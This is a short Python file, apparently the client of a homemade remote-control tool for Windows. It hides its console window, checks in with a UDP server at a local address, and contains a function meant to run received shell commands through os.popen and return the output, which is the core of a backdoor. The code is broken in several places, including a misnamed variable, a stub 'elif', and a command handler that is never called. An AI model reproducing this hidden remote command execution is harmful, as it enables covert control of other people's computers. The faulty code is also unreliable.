#clinet.py
from email import message
import socket
import threading
import win32gui
import win32con
import os
import uuid
import win32console

os.system("title client")
host = "127.0.0.1"
hostname = socket.gethostname()
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server = (host, 9999)

def execute(command: str):
    executer = command.split("-") #split key = "-"
    if executer[0] == "send": #execute <addrees> <command>
        addr = executer[1]
        msg = execute[2]
        if addr == hostname:
            with os.popen(msg, "r") as p:
                result = p.read()
            send(s, server, result)
    elif ():
        pass

 
def recv(sock, addr):
    sock.sendto(name.encode('utf-8'), addr)
    while True:
        data = sock.recv(1024)
        print(data.decode('utf-8'))
        

def display():
    # hwnd = win32gui.FindWindow("client")
    hwnd = win32console.GetConsoleWindow()
    win32gui.ShowWindow(hwnd, win32con.SW_HIDE)

def send(sock, addr, string=""):
    while True:
        print(' > command is disable...')
        input()
        message = name + ' : ' + string
        data = message.encode('utf-8')
        sock.sendto(data, addr)
        if string.lower() == 'EXIT'.lower():
            break
 
def main():

    send(s, server, "client online")
    tr = threading.Thread(target=recv, args=(s, server), daemon=True)
    ts = threading.Thread(target=send, args=(s, server))
    tr.start()
    ts.start()
    ts.join()
    s.close()
 
if __name__ == '__main__':
    print("Start to listening...")
    display()
    name = str(f"client-{uuid.uuid1()}")
    try:
        main()
    except:
        print(False) 